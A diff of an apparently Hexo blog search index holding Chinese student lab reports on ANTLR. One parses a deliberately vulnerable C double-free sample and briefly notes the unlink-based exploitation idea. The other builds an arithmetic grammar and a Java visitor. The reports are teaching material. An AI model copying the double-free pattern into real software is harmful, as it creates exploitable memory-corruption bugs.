@@ -195,6 +195,198 @@
       </tags>
   </entry>
   <entry>
+    <title>借助 ANTLR 分析代码中的漏洞</title>
+    <url>/2019/06/09/experiments/antlr-2/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><h2 id="实验目的">实验目的</h2>
+<p>通过分析特定漏洞代码特点，借助 ANTLR 分析代码中的特定漏洞。</p>
+<span id="more"></span>
+<h2 id="实验条件">实验条件</h2>
+<ol>
+<li>Windows 10 专业版</li>
+<li> JDK 1.8 版本（64 位，版本号为 1.8.0_202）</li>
+<li>ANTLR 环境 ——ANTLR 4</li>
+</ol>
+<h2 id="实验内容">实验内容</h2>
+<h3 id="漏洞描述">漏洞描述</h3>
+<ul>
+<li>
+<p>Double Free，多次释放漏洞，是对指向同一个地址的指针进行两次及以上的操作，可能会造成任意代码执行或其他非预期危害。虽然一般把它叫做 double free。其实只要是 <code>free</code> 一个指向堆内存的指针都有可能产生可以利用的漏洞。</p>
+</li>
+<li>
+<p>一段简单的漏洞代码示例如下所示，其中对 <code>char* buf2R1</code> 所指向的内存进行了两次释放操作</p>
+  <figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFSIZE1 512</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFSIZE2 ((BUFSIZE1/2) - 8) <span class="comment">//248</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> { </span><br><span class="line">	<span class="type">char</span> *buf1R1; </span><br><span class="line">	<span class="type">char</span> *buf2R1; </span><br><span class="line">	<span class="type">char</span> *buf1R2; </span><br><span class="line">	buf1R1 = (<span class="type">char</span> *) <span class="built_in">malloc</span>(BUFSIZE2); </span><br><span class="line">	buf2R1 = (<span class="type">char</span> *) <span class="built_in">malloc</span>(BUFSIZE2); </span><br><span class="line">	<span class="built_in">free</span>(buf1R1); </span><br><span class="line">	<span class="built_in">free</span>(buf2R1); </span><br><span class="line">	buf1R2 = (<span class="type">char</span> *) <span class="built_in">malloc</span>(BUFSIZE1); </span><br><span class="line">	<span class="built_in">strncpy</span>(buf1R2, argv[<span class="number">1</span>], BUFSIZE1<span class="number">-1</span>); </span><br><span class="line">	<span class="built_in">free</span>(buf2R1); </span><br><span class="line">	<span class="built_in">free</span>(buf1R2); </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+</li>
+<li>
+<p>double free 的原理其实和堆溢出的原理差不多，都是通过 unlink 这个双向链表删除的宏来利用的。只是 double free 需要由自己来伪造整个 chunk 并且欺骗操作系统。</p>
+</li>
+</ul>
+<h3 id="语法识别">语法识别</h3>
+<div class="note info"><p>利用 ANTLR4 的 C++ 语言语法规则文件，对漏洞代码进行分析。</p>
+</div>
+<ol>
+<li>
+<p>右键点击 g4 中的 translationunit，选择 test rule，将那个有漏洞的 C 代码制作成 expr 文件后，作为输入。</p>
+</li>
+<li>
+<p>然后在输出位置就可以看到好大一棵 parseTree 了！右键另存为一张图。</p>
+ <img data-src="/2019/06/09/experiments/antlr-2/parseTree-full.png" class="" width="500" height="500">
+</li>
+<li>
+<p>ParseTree 全貌，其中左边的一小撮是函数头定义，右边的一大撮才是函数体定义。</p>
+<ul>
+<li>首先定义了三个字符指针型变量 <code>buf1R1</code>、<code>buf2R1</code>、<code>buf1R2</code><img data-src="/2019/06/09/experiments/antlr-2/1.png" class="">
+</li>
+<li>然后为 <code>buf1R1</code> 分配了 <code>BUFSIZE2</code> 大小的空间，为 <code>buf2R1</code> 分配了 <code>BUFSIZE2</code> 大小的空间 <img data-src="/2019/06/09/experiments/antlr-2/3.png" class=""> <img data-src="/2019/06/09/experiments/antlr-2/4.png" class=""></li>
+</ul>
+</li>
+<li>
+<p>紧接着 <code>free</code> 掉它们 <img data-src="/2019/06/09/experiments/antlr-2/5.png" class=""></p>
+</li>
+<li>
+<p>为 <code>buf1R2</code> 分配空间，大小为 <code>bufsize1</code></p>
+<img data-src="/2019/06/09/experiments/antlr-2/6.png" class="">
+</li>
+<li>
+<p>把 <code>argv[1]</code> 中的内容复制到 <code>buf1R2</code> 所指空间中 <img data-src="/2019/06/09/experiments/antlr-2/7.png" class=""> <img data-src="/2019/06/09/experiments/antlr-2/8.png" class=""></p>
+</li>
+<li>
+<p>最后的两个 <code>free</code> 语句都在语法分析树的右侧 <img data-src="/2019/06/09/experiments/antlr-2/9.png" class=""></p>
+</li>
+</ol>
+<div class="note primary"><p>从语法分析树中看不出任何问题，因为这个存在漏洞的代码是语法正确的，而且也符合 C 语言语法结构。所以我们在编写相关代码时，要自行检查指针的使用情况，最好在释放指针所指向的空间后，将其置为 <code>NULL</code>。</p>
+</div>
+<h2 id="实验总结">实验总结</h2>
+<p>本实验中通过学习带有漏洞的 C 语言代码，了解到一些常见的二进制相关漏洞，借助到 C 语言的语法规则文件，对漏洞代码进行分解研究，了解到了我们所写的程序通过语法树展开后的样子，并试着提取其规则，编写漏洞描述 xml 文件。</p>
+<p>中途遇到了 IntelliJ IDEA 无法解析规则，找不到 start rule 的问题，后来通过在 cpp14.g4 文件中右击 translationunit 规则，点击 test translationunit rule 找到了语法树的生成点，从而成功在 ANTLR Output 中看到了所生成的语法树。</p>
+]]></content>
+      <categories>
+        <category>实验</category>
+        <category>编译原理</category>
+        <category>漏洞</category>
+        <category>双重释放</category>
+      </categories>
+      <tags>
+        <tag>ANTLR</tag>
+        <tag>编译原理</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ANTLR 语言识别工具</title>
+    <url>/2019/05/20/experiments/antlr/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><h2 id="实验目的">实验目的</h2>
+<ol>
+<li>了解 ANTLR 语言识别工具，安装 ANTLR 环境，熟悉 ANTLR 的使用。</li>
+<li>掌握使用 ANTLR 构建的语法分析器和树解析器分析语言，通过 ANTLR 实现语法分析过程。</li>
+</ol>
+<span id="more"></span>
+<h2 id="实验条件">实验条件</h2>
+<ol>
+<li>Windows 10 专业版</li>
+<li> JDK 1.8 版本（64 位，版本号为 1.8.0_202）</li>
+<li>ANTLR 环境 ——ANTLR 4</li>
+</ol>
+<h2 id="实验内容">实验内容</h2>
+<h3 id="安装ANTLR">安装 ANTLR</h3>
+<p>个人所用的集成开发环境中提供 ANTLR 插件的安装，故可直接进入插件下载功能中下载该插件。运行时环境配置过程和安装过程不再赘述。</p>
+<img data-src="/2019/05/20/experiments/antlr/1.png" class=""> 
+<p>安装以后，下方工具栏会多出两个窗口：ANTLR Preview 和 Tool Output。</p>
+<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/05/20/experiments/antlr/2.png" class="" title="ANTLR Preivew窗口"></div><div class="group-picture-column"><img data-src="/2019/05/20/experiments/antlr/3.png" class="" title="Tool Output窗口"></div></div></div> 
+<p>Preview 中可以显示 Parse tree，从而省去了在控制台中输入 <code>-gui</code> 命令的麻烦。</p>
+<h3 id="使用ANTLR实现实数的四则运算">使用 ANTLR 实现实数的四则运算</h3>
+<div class="note info"><h4 id="要求">要求</h4>
+<p>创建 ANTLR 语法文件 <code>expr.g4</code>，解析如赋值语句 <code>a = 5.5</code> 和表达式 <code>a+4*3÷2-1</code> 这样的语句。</p>
+<ul>
+<li>要验证所编写的文法是否正确，可使用 TestRig 测试语法，在 CMD 中输入 <code>-gui</code> 可直观展示其语法分析树。</li>
+<li>创建 expr 文件（如 test.expr，输入一个表达式）检验程序是否能够正确运行和计算四则算式。</li>
+</ul>
+</div>
+<ol>
+<li>
+<p>文法设计</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line"> </span><br><span class="line">E -&gt; E OP E|VAR = E|E'; E'-&gt; D; OP: [+|-|*|/]; D:[0-9]+; VAR:[a-zA-Z]+; </span><br></pre></td></tr></tbody></table></figure>
+<p>由此编写的 <code>expr.g4</code> 文件如下：（还考虑了一些换行及空格因素）</p>
+<figure class="highlight plaintext"><figcaption><span>expr.g4</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"> </span><br><span class="line">grammar expr; </span><br><span class="line">exprs : setExpr | calcExpr ; </span><br><span class="line">setExpr : id=ID '=' num=NUMBER ; </span><br><span class="line">calcExpr: calcExpr op=(MUL | DIV) calcExpr | calcExpr op=(ADD | SUB) calcExpr | factor ; </span><br><span class="line">factor: (sign=(ADD | SUB))? num=NUMBER // 计算因子可以是一个正数或负数 </span><br><span class="line">                           | id=ID // 计算因子可以是一个变量 ; </span><br><span class="line">WS : [ \t\n\r]+ -&gt; skip ; </span><br><span class="line">ID : [a-zA-Z]+ ; </span><br><span class="line">NUMBER : [0-9]+('.'([0-9]+)?)? ; </span><br><span class="line">ADD : '+' ; </span><br><span class="line">SUB : '-' ; </span><br><span class="line">MUL : '*' ; </span><br><span class="line">DIV : '/' ; </span><br></pre></td></tr></tbody></table></figure>
+</li>
+<li>
+<p>运行结果</p>
+</li>
+</ol>
+<div class="tabs" id="results"><ul class="nav-tabs"><li class="tab active"><a href="#results-1">赋值语句</a></li><li class="tab"><a href="#results-2">不完整的式子</a></li><li class="tab"><a href="#results-3">一个正常的运算式</a></li><li class="tab"><a href="#results-4">异常处理</a></li></ul><div class="tab-content"><div class="tab-pane active" id="results-1"><p>控制台工具显示如下<br>
+<img data-src="/2019/05/20/experiments/antlr/res1-1.png" class=""></p>
+<p>Main 函数如下</p>
+<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"> </span><br><span class="line marked"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>{ </span><br><span class="line">	<span class="type">String</span> <span class="variable">input_string</span> <span class="operator">=</span> <span class="string">"a=5.5"</span>;</span><br><span class="line">	<span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> System.in; </span><br><span class="line">	<span class="keyword">try</span>{ </span><br><span class="line">		<span class="type">ANTLRInputStream</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ANTLRInputStream</span>(input_string); </span><br><span class="line">		<span class="type">exprLexer</span> <span class="variable">lexer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">exprLexer</span>(input); </span><br><span class="line">		<span class="type">CommonTokenStream</span> <span class="variable">tokens</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonTokenStream</span>(lexer); </span><br><span class="line">		<span class="type">exprParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">exprParser</span>(tokens);</span><br><span class="line">		<span class="type">ParseTree</span> <span class="variable">tree</span> <span class="operator">=</span> parser.exprs(); </span><br><span class="line">		<span class="type">Visitor</span> <span class="variable">visitor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Visitor</span>(); </span><br><span class="line">		System.out.println(visitor.visit(tree)); </span><br><span class="line">	} <span class="keyword">catch</span>(IOException ioe){ </span><br><span class="line">		ioe.printStackTrace(); </span><br><span class="line">	} </span><br><span class="line">} </span><br></pre></td></tr></tbody></table></figure>
+<p>运行结果如下<br>
+<img data-src="/2019/05/20/experiments/antlr/res1-2.png" class="" title="在visitSetExpr时触发了其中的打印操作，外层返回值为null"></p></div><div class="tab-pane" id="results-2"><div class="note "><p>本次测试的式子为 <code>a+4*3/2-1</code></p>
+</div>
+<p>控制台工具显示如下<br>
+<img data-src="/2019/05/20/experiments/antlr/res2-1.png" class=""></p>
+<p>Main 函数如下</p>
+<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"> </span><br><span class="line marked"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>{ </span><br><span class="line">	<span class="type">String</span> <span class="variable">input_string</span> <span class="operator">=</span> <span class="string">"a+4*3/2-1"</span>;</span><br><span class="line">	<span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> System.in; </span><br><span class="line">	<span class="keyword">try</span>{ </span><br><span class="line">		<span class="type">ANTLRInputStream</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ANTLRInputStream</span>(input_string); </span><br><span class="line">		<span class="type">exprLexer</span> <span class="variable">lexer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">exprLexer</span>(input); </span><br><span class="line">		<span class="type">CommonTokenStream</span> <span class="variable">tokens</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonTokenStream</span>(lexer); </span><br><span class="line">		<span class="type">exprParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">exprParser</span>(tokens);</span><br><span class="line">		<span class="type">ParseTree</span> <span class="variable">tree</span> <span class="operator">=</span> parser.exprs(); </span><br><span class="line">		<span class="type">Visitor</span> <span class="variable">visitor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Visitor</span>(); </span><br><span class="line">		System.out.println(visitor.visit(tree)); </span><br><span class="line">	} <span class="keyword">catch</span>(IOException ioe){ </span><br><span class="line">		ioe.printStackTrace(); </span><br><span class="line">	} </span><br><span class="line">} </span><br></pre></td></tr></tbody></table></figure>
+<img data-src="/2019/05/20/experiments/antlr/res2-2.png" class="" title="为了方便，在每个函数的visit函数外层加了一个控制台打印输出"> 
+从输出来看，对语法树的遍历过程几乎遍及了句子的每一个结点。由于最后得到的句型是一个类似于 <code>a + &lt;数字&gt;</code> 的格式，所以它输出 <code>NaN</code>，与预期一致。
+<div class="note warning"><p><code>a</code> 是与前一个赋值语句分开输入的，所以它并没有被定义值</p>
+</div></div><div class="tab-pane" id="results-3"><div class="note "><p>本次测试的式子为 <code>1+4.5*2-3/3</code></p>
+</div>
+<p>Main 函数代码类似，控制台工具显示如下<br>
+<img data-src="/2019/05/20/experiments/antlr/res3-1.png" class="" title="分析树的结构与预期一致"></p>
+<p>代码输出结果如下<br>
+<img data-src="/2019/05/20/experiments/antlr/res3-2.png" class=""><br>
+得到了正确的输出结果，证明我们写的语法解析是正确的。</p></div><div class="tab-pane" id="results-4"><ol>
+<li>针对除 0 错误，程序可以顺利显示出 <code>Infinity</code>，没有中断程序<br>
+<img data-src="/2019/05/20/experiments/antlr/res4-1.png" class=""></li>
+<li>输入过长也不会中断程序<br>
+<img data-src="/2019/05/20/experiments/antlr/res4-2.png" class=""></li>
+<li>符号错误需要单独处理<br>
+<img data-src="/2019/05/20/experiments/antlr/res4-3.png" class="" title="报错：不被识别的字符（本例输入了分号），需要一个ID，NUMBER，加号或减号"></li>
+</ol>
+<div class="note warning"><p>这说明符号错误需要单独处理，java 中可以使用 try-catch 来完成这项工作。除此之外，也可从前端角度考虑，提前检验用户输入。</p>
+</div></div></div></div>
+<h2 id="总结">总结</h2>
+<p>这个解析过程是怎么实现的呢？</p>
+<ul>
+<li>在生成 ANTLR 识别文件时，实际上生成了很多个 java 和 token 源文件。</li>
+</ul>
+<img data-src="/2019/05/20/experiments/antlr/end1.png" class="">
+<img data-src="/2019/05/20/experiments/antlr/end2.png" class="">
+<ul>
+<li>
+<p>有两个 tokens 文件和六个 java 文件，<code>Listener</code> 和 <code>Visitor</code> 是两个接口，<code>Listener</code> 中定义了一些退出或进入一个表达式中所进行的语法动作，<code>Visitor</code> 中定义了遍历语法树中项目的返回动作，一个语法项对应一个 <code>visit</code> 函数。具体由 <code>xxBaseListener</code> 或 <code>xxBaseVisitor</code> 来实现。默认状态下，所有的实现都是空的，我们可以扩展 <code>xxBase[Listener|Visitor]</code> 类，自己定义语法动作。本实验中，只需要实现 <code>Visitor</code> 的内容即可，不过由于上下文的关系，我们需要自建一个 <code>Context</code> 类，负责上下文内容的保存和识别。</p>
+</li>
+<li>
+<p>重写 <code>visit</code> 函数：</p>
+  <figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;你需要的返回值&gt; visit&lt;A&gt;(xxParser.&lt;A&gt;Context ctx)</span><br></pre></td></tr></tbody></table></figure>
+</li>
+<li>
+<p>.tokens 文件中将语法常量对应了一个整数数值，方便常量的建立。.interp 文件则记录了字面值。</p>
+</li>
+<li>
+<p>Parser 中，对每一个语法变量，生成了很多上下文相关的方法（xxContext）。其中的某些常量在前面所述的.tokens 文件中可以找到。</p>
+</li>
+<li>
+<p>Lexer 中，则存储了字面量及其相关方法，某些内容可在.interp 文件中找到。</p>
+</li>
+<li>
+<p>而所有开头的 xx 来自于语法文件第一行的 grammar xx，即为语法名。</p>
+</li>
+<li>
+<p><code>Visitor</code> 实现完成后，在主函数中建立 <code>visitor</code> 对象，调用 <code>visit</code> 语法树方法，将用户输入作为参数传入，其返回值即为语法分析结果。</p>
+</li>
+</ul>
+<figure class="highlight java"><figcaption><span>visitor.java</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Visitor</span> <span class="keyword">extends</span> <span class="title class_">exprBaseVisitor</span>&lt;Double&gt;{</span><br><span class="line">	<span class="meta">@Override</span> </span><br><span class="line">	<span class="keyword">public</span> Double <span class="title function_">visitExprs</span><span class="params">(exprParser.ExprsContext ctx)</span>{ </span><br><span class="line">		<span class="comment">//System.out.println("visit exprs"); </span></span><br><span class="line">		<span class="keyword">return</span> visit(ctx.getChild(<span class="number">0</span>)); </span><br><span class="line">	}</span><br><span class="line">	<span class="meta">@Override</span> </span><br><span class="line">	<span class="keyword">public</span> Double <span class="title function_">visitSetExpr</span><span class="params">(exprParser.SetExprContext ctx)</span>{</span><br><span class="line">		Context.getInstance().setContext(ctx.id.getText(), ctx.num.getText());</span><br><span class="line">		System.out.println(<span class="string">"Assign operation in current line:"</span> + ctx.id.getText() + <span class="string">" = "</span> + ctx.num.getText());</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">	}</span><br><span class="line">	<span class="meta">@Override</span> </span><br><span class="line">	<span class="keyword">public</span> Double <span class="title function_">visitCalcExpr</span><span class="params">(exprParser.CalcExprContext ctx)</span>{ </span><br><span class="line">		<span class="comment">//System.out.println("visit calc expr "); </span></span><br><span class="line">		<span class="type">int</span> <span class="variable">cc</span> <span class="operator">=</span> ctx.getChildCount(); </span><br><span class="line">		<span class="keyword">if</span> (cc == <span class="number">3</span>) { </span><br><span class="line">			<span class="keyword">switch</span> (ctx.op.getType()) { </span><br><span class="line">				<span class="keyword">case</span> exprParser.ADD:</span><br><span class="line">					<span class="keyword">return</span> visit(ctx.calcExpr(<span class="number">0</span>)) + visit(ctx.calcExpr(<span class="number">1</span>));</span><br><span class="line">				<span class="keyword">case</span> exprParser.SUB:</span><br><span class="line">					<span class="keyword">return</span> visit(ctx.calcExpr(<span class="number">0</span>)) - visit(ctx.calcExpr(<span class="number">1</span>));</span><br><span class="line">				<span class="keyword">case</span> exprParser.MUL:</span><br><span class="line">					<span class="keyword">return</span> visit(ctx.calcExpr(<span class="number">0</span>)) * visit(ctx.calcExpr(<span class="number">1</span>));</span><br><span class="line">				<span class="keyword">case</span> exprParser.DIV:</span><br><span class="line">					<span class="keyword">return</span> visit(ctx.calcExpr(<span class="number">0</span>)) / visit(ctx.calcExpr(<span class="number">1</span>));</span><br><span class="line">			}</span><br><span class="line">		}</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(cc == <span class="number">1</span>)</span><br><span class="line">		{</span><br><span class="line">			<span class="keyword">return</span> visit(ctx.getChild(<span class="number">0</span>));</span><br><span class="line">		}</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>();</span><br><span class="line">	}</span><br><span class="line">	<span class="meta">@Override</span> </span><br><span class="line">	<span class="keyword">public</span> Double <span class="title function_">visitFactor</span><span class="params">(exprParser.FactorContext ctx)</span>{ </span><br><span class="line">		<span class="comment">//System.out.println("visit factor"); </span></span><br><span class="line">		<span class="type">int</span> <span class="variable">cc</span> <span class="operator">=</span> ctx.getChildCount(); </span><br><span class="line">		<span class="keyword">if</span> (cc == <span class="number">3</span>) { </span><br><span class="line">			<span class="keyword">return</span> visit(ctx.getChild(<span class="number">1</span>)); </span><br><span class="line">		} <span class="keyword">else</span> <span class="keyword">if</span> (cc == <span class="number">2</span>) { </span><br><span class="line">			<span class="keyword">if</span> (ctx.sign.getType() == exprParser.ADD)</span><br><span class="line">				<span class="keyword">return</span> Double.valueOf(ctx.getChild(<span class="number">1</span>).getText());</span><br><span class="line">			<span class="keyword">if</span>(ctx.sign.getType() == exprParser.SUB) </span><br><span class="line">				<span class="keyword">return</span> -<span class="number">1</span> * Double.valueOf(ctx.getChild(<span class="number">1</span>).getText());</span><br><span class="line">		}</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(cc == <span class="number">1</span>){</span><br><span class="line">			<span class="keyword">if</span>(ctx.num != <span class="literal">null</span>) <span class="keyword">return</span> Double.valueOf(ctx.getChild(<span class="number">0</span>).getText());</span><br><span class="line">			<span class="keyword">if</span>(ctx.id != <span class="literal">null</span>) <span class="keyword">return</span> Context.getInstance().getValue(ctx.id.getText());</span><br><span class="line">		}</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>();</span><br><span class="line">	}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<ul>
+<li>目前实现的版本中，可以正确地进行运算，但还没有实现连续赋值功能，也没有考虑到多语句的分隔及分开解析，例如输入 <code>"a=1 a+1"</code> 后不能得到 <code>2</code>，可能需要修改 <code>Context</code> 类和 <code>Visitor</code> 类中的代码，使其可以记录上下文信息，将 <code>a</code> 的值存入暂存区。</li>
+</ul>
+]]></content>
+      <categories>
+        <category>实验</category>
+        <category>编译原理</category>
+      </categories>
+      <tags>
+        <tag>ANTLR</tag>
+        <tag>编译原理</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>北邮小日记 —— 第一期</title>
     <url>/2017/10/11/diarys/bupt-1/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><p>大家好，我是任子恒，好久不见，你们也有很长时间没有看到我在这个公众号上更新文字了。进北邮也有一个月了，一直忙于其他琐碎事情，没有来得及停一下，用文字记录下多彩的大学生活。</p>
@@ -598,7 +790,7 @@
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><p>期中考试终于都结束了！！有时间写东西啦～</p>
 <span id="more"></span>
 
-    <div id="aplayer-pwzXLpfD" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="002X3RjI43O8qj" data-server="tencent" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#ad7a86"></div>
+    <div id="aplayer-CXwZJnsh" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="002X3RjI43O8qj" data-server="tencent" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#ad7a86"></div>
 <p>分数都还可以，至少都及格了，当然还可以做到更好，这得靠接下来的努力了～</p>
 <p>不过，我这些同学，还得往上带一带…… 毕竟作为学委的我还是见识到了不少让人抓狂的情况的…… 跟这里我吐槽一下，作业交得晚、借作业去抄… 都是常事。当然，也有很努力在学习的同学，他们会找我问题，我也会很乐意给出解答，这给我一次运用知识的机会，也增强了我和同学们的交流。对了，借这个当学委的机会我也几乎把全班同学认全了，哦耶！</p>
 <p>上周五听说要搬宿舍了，据说原因是另一个校区一整个院的同学都搬了过来，需要腾出一个楼来给其中的女生住，调整方案是说我现在所在楼 - 5 楼的同学要搬到 3 楼去，而 3 楼的女生要搬过来和要住进来的女生并一个楼。如果不出意外的话，这就是我的坐标处于 S5-535 的最后几天了，没想到我之前曾经说过要去 S3 看一看的愿望竟然这么快就实现了 hhh，但是我这么多东西该怎么搬啊……</p>
@@ -721,198 +913,6 @@
         <tag>北邮小日记</tag>
         <tag>life-in-bupt</tag>
         <tag>special</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>借助 ANTLR 分析代码中的漏洞</title>
-    <url>/2019/06/09/experiments/antlr-2/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><h2 id="实验目的">实验目的</h2>
-<p>通过分析特定漏洞代码特点，借助 ANTLR 分析代码中的特定漏洞。</p>
-<span id="more"></span>
-<h2 id="实验条件">实验条件</h2>
-<ol>
-<li>Windows 10 专业版</li>
-<li> JDK 1.8 版本（64 位，版本号为 1.8.0_202）</li>
-<li>ANTLR 环境 ——ANTLR 4</li>
-</ol>
-<h2 id="实验内容">实验内容</h2>
-<h3 id="漏洞描述">漏洞描述</h3>
-<ul>
-<li>
-<p>Double Free，多次释放漏洞，是对指向同一个地址的指针进行两次及以上的操作，可能会造成任意代码执行或其他非预期危害。虽然一般把它叫做 double free。其实只要是 <code>free</code> 一个指向堆内存的指针都有可能产生可以利用的漏洞。</p>
-</li>
-<li>
-<p>一段简单的漏洞代码示例如下所示，其中对 <code>char* buf2R1</code> 所指向的内存进行了两次释放操作</p>
-  <figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFSIZE1 512</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFSIZE2 ((BUFSIZE1/2) - 8) <span class="comment">//248</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> { </span><br><span class="line">	<span class="type">char</span> *buf1R1; </span><br><span class="line">	<span class="type">char</span> *buf2R1; </span><br><span class="line">	<span class="type">char</span> *buf1R2; </span><br><span class="line">	buf1R1 = (<span class="type">char</span> *) <span class="built_in">malloc</span>(BUFSIZE2); </span><br><span class="line">	buf2R1 = (<span class="type">char</span> *) <span class="built_in">malloc</span>(BUFSIZE2); </span><br><span class="line">	<span class="built_in">free</span>(buf1R1); </span><br><span class="line">	<span class="built_in">free</span>(buf2R1); </span><br><span class="line">	buf1R2 = (<span class="type">char</span> *) <span class="built_in">malloc</span>(BUFSIZE1); </span><br><span class="line">	<span class="built_in">strncpy</span>(buf1R2, argv[<span class="number">1</span>], BUFSIZE1<span class="number">-1</span>); </span><br><span class="line">	<span class="built_in">free</span>(buf2R1); </span><br><span class="line">	<span class="built_in">free</span>(buf1R2); </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
-</li>
-<li>
-<p>double free 的原理其实和堆溢出的原理差不多，都是通过 unlink 这个双向链表删除的宏来利用的。只是 double free 需要由自己来伪造整个 chunk 并且欺骗操作系统。</p>
-</li>
-</ul>
-<h3 id="语法识别">语法识别</h3>
-<div class="note info"><p>利用 ANTLR4 的 C++ 语言语法规则文件，对漏洞代码进行分析。</p>
-</div>
-<ol>
-<li>
-<p>右键点击 g4 中的 translationunit，选择 test rule，将那个有漏洞的 C 代码制作成 expr 文件后，作为输入。</p>
-</li>
-<li>
-<p>然后在输出位置就可以看到好大一棵 parseTree 了！右键另存为一张图。</p>
- <img data-src="/2019/06/09/experiments/antlr-2/parseTree-full.png" class="" width="500" height="500">
-</li>
-<li>
-<p>ParseTree 全貌，其中左边的一小撮是函数头定义，右边的一大撮才是函数体定义。</p>
-<ul>
-<li>首先定义了三个字符指针型变量 <code>buf1R1</code>、<code>buf2R1</code>、<code>buf1R2</code><img data-src="/2019/06/09/experiments/antlr-2/1.png" class="">
-</li>
-<li>然后为 <code>buf1R1</code> 分配了 <code>BUFSIZE2</code> 大小的空间，为 <code>buf2R1</code> 分配了 <code>BUFSIZE2</code> 大小的空间 <img data-src="/2019/06/09/experiments/antlr-2/3.png" class=""> <img data-src="/2019/06/09/experiments/antlr-2/4.png" class=""></li>
-</ul>
-</li>
-<li>
